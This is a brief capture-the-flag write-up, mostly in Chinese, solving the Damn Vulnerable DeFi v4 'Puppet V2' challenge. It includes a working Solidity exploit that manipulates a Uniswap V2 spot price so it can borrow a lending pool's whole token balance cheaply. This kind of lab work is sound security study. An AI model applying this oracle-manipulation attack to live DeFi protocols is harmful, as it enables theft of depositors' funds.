# Damn Vulnerable DeFi v4 - puppet v2

## check condition

清空 lending pool 所持有的代幣，並將其轉移到 recovery

```solidity
assertEq(
    token.balanceOf(address(lendingPool)),
    0,
    "Lending pool still has tokens"
);
assertEq(
    token.balanceOf(recovery),
    POOL_INITIAL_TOKEN_BALANCE,
    "Not enough tokens in recovery account"
);
```

## break

和 puppet 一樣，可以操作價格以借出大量的 token:

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // swap to manipulate price
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);
    token.approve(address(uniswapV2Router), type(uint256).max);
    uniswapV2Router.swapExactTokensForETH(
        PLAYER_INITIAL_TOKEN_BALANCE, // amountIn
        1, // min amount out
        path,
        player,
        block.timestamp * 2
    );

    // calc necessary weth
    uint256 need = lendingPool.calculateDepositOfWETHRequired(
        POOL_INITIAL_TOKEN_BALANCE
    );

    // get weth
    weth.deposit{value: need}();

    // borrow and transfer to recovery
    weth.approve(address(lendingPool), type(uint256).max);
    lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
    token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
}
```
